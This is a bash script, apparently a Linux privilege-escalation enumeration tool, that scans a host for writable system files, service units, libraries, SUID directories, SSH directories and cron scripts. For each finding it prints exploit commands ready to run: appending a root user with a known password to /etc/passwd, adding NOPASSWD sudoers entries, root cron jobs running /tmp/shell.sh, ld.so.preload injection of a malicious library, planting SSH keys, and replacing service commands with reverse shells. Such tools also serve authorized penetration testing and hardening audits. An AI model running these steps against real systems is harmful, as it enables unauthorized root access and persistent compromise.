#!/bin/bash
# Find Exploitable Writable Files
# Usage: ./writable_files.sh

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'

echo -e "${GREEN}=== Writable Files Privilege Escalation ===${NC}\n"

# ── Critical System Files ──
echo -e "${GREEN}--- Critical System Files ---${NC}\n"

declare -A CRITICAL_FILES
CRITICAL_FILES[/etc/passwd]="Add root user: echo 'hacker:\$1\$salt\$hash:0:0::/root:/bin/bash' >> /etc/passwd"
CRITICAL_FILES[/etc/shadow]="Replace root hash: edit root line with known password hash"
CRITICAL_FILES[/etc/sudoers]="Add sudo access: echo 'username ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
CRITICAL_FILES[/etc/crontab]="Add cron job: echo '* * * * * root /tmp/shell.sh' >> /etc/crontab"
CRITICAL_FILES[/etc/ld.so.preload]="Preload malicious library: echo '/tmp/evil.so' > /etc/ld.so.preload"
CRITICAL_FILES[/etc/ld.so.conf]="Add library path: echo '/tmp' >> /etc/ld.so.conf && ldconfig"
CRITICAL_FILES[/etc/environment]="Set LD_PRELOAD: echo 'LD_PRELOAD=/tmp/evil.so' >> /etc/environment"
CRITICAL_FILES[/etc/profile]="Shell startup command injection"
CRITICAL_FILES[/etc/bash.bashrc]="System-wide bash startup injection"
CRITICAL_FILES[/etc/ssh/sshd_config]="Enable root login, change auth settings"
CRITICAL_FILES[/root/.ssh/authorized_keys]="Plant SSH key for root access"

for f in "${!CRITICAL_FILES[@]}"; do
    if [ -w "$f" ]; then
        echo -e "${RED}[!] WRITABLE: $f${NC}"
        echo -e "    Exploit: ${CRITICAL_FILES[$f]}"
        echo ""
    fi
done

# ── Writable /etc/passwd (add root user) ──
if [ -w /etc/passwd ]; then
    echo -e "${GREEN}--- /etc/passwd Exploit ---${NC}\n"
    echo -e "${RED}[!] /etc/passwd is writable — add a root user:${NC}"
    echo ""
    echo "  # Generate password hash"
    echo '  openssl passwd -1 -salt hacker password123'
    echo "  # Output: \$1\$hacker\$TdQYLhbXMheRn9S70ICre1"
    echo ""
    echo '  # Append root user'
    echo '  echo "hacker:$1$hacker$TdQYLhbXMheRn9S70ICre1:0:0::/root:/bin/bash" >> /etc/passwd'
    echo ""
    echo "  # Login"
    echo "  su hacker  # password: password123"
    echo ""
fi

# ── Service Files ──
echo -e "${GREEN}--- Writable Service Files ---${NC}\n"

# systemd service files
find /etc/systemd/system/ /usr/lib/systemd/system/ /lib/systemd/system/ -writable -name '*.service' 2>/dev/null | while read -r svc; do
    echo -e "${RED}[!] Writable service: $svc${NC}"
    RUNS_AS=$(grep -i 'user=' "$svc" 2>/dev/null || echo "    (likely root)")
    echo "    $RUNS_AS"
    echo "    Exploit: Replace ExecStart with reverse shell"
    echo ""
done

# init.d scripts
find /etc/init.d/ -writable -type f 2>/dev/null | while read -r initd; do
    echo -e "${RED}[!] Writable init.d script: $initd${NC}"
    echo "    Exploit: Inject reverse shell into script"
    echo ""
done

# ── Shared Libraries ──
echo -e "${GREEN}--- Writable Shared Libraries ---${NC}\n"
find /usr/lib /usr/lib64 /lib /lib64 /usr/local/lib -writable -name '*.so*' 2>/dev/null | head -20 | while read -r lib; do
    echo -e "${RED}[!] Writable library: $lib${NC}"
    # Find what uses it
    USERS=$(grep -rl "$lib" /proc/*/maps 2>/dev/null | head -3 | grep -oP '\d+' | while read pid; do
        ps -p "$pid" -o comm= 2>/dev/null
    done)
    [ -n "$USERS" ] && echo "    Used by: $USERS"
done

# ── SUID Binary Directories ──
echo -e "\n${GREEN}--- Writable SUID Binary Directories ---${NC}\n"
find / -perm -4000 -type f 2>/dev/null | while read -r suid; do
    DIR=$(dirname "$suid")
    if [ -w "$DIR" ]; then
        echo -e "${RED}[!] SUID binary in writable dir: $suid${NC}"
        echo "    Directory: $DIR"
        echo "    Exploit: Replace binary or add DLL/library hijack"
        echo ""
    fi
done

# ── SSH authorized_keys Directories ──
echo -e "${GREEN}--- Writable SSH Directories ---${NC}\n"
for home in /root /home/*; do
    SSH_DIR="$home/.ssh"
    if [ -d "$SSH_DIR" ] && [ -w "$SSH_DIR" ]; then
        echo -e "${RED}[!] Writable .ssh directory: $SSH_DIR${NC}"
        echo "    Exploit: echo 'YOUR_SSH_PUBLIC_KEY' >> $SSH_DIR/authorized_keys"
        echo ""
    fi
    AUTH_KEYS="$SSH_DIR/authorized_keys"
    if [ -f "$AUTH_KEYS" ] && [ -w "$AUTH_KEYS" ]; then
        echo -e "${RED}[!] Writable authorized_keys: $AUTH_KEYS${NC}"
        echo ""
    fi
done

# ── Log Files (for log poisoning) ──
echo -e "${GREEN}--- Writable Log Files (for poisoning) ---${NC}\n"
for log in /var/log/auth.log /var/log/syslog /var/log/apache2/access.log /var/log/apache2/error.log /var/log/nginx/access.log /var/log/nginx/error.log /var/log/mail.log; do
    if [ -w "$log" ]; then
        echo -e "${YELLOW}[*] Writable log: $log${NC}"
    fi
done

# ── World-Writable Files Owned by Root ──
echo -e "\n${GREEN}--- World-Writable Root-Owned Files ---${NC}\n"
find / -writable -user root -type f 2>/dev/null | grep -vE '/proc|/sys|/dev|/tmp' | head -20 | while read -r f; do
    echo -e "${YELLOW}[*] $f${NC}"
done

# ── Cron Script Files ──
echo -e "\n${GREEN}--- Writable Cron Scripts ---${NC}\n"
for cf in /etc/crontab /etc/cron.d/*; do
    [ -f "$cf" ] || continue
    grep -oP '(/\S+)' "$cf" 2>/dev/null | while read -r script; do
        if [ -f "$script" ] && [ -w "$script" ]; then
            echo -e "${RED}[!] Writable cron script: $script (from $cf)${NC}"
        fi
    done
done

echo -e "\n${GREEN}=== Scan Complete ===${NC}"
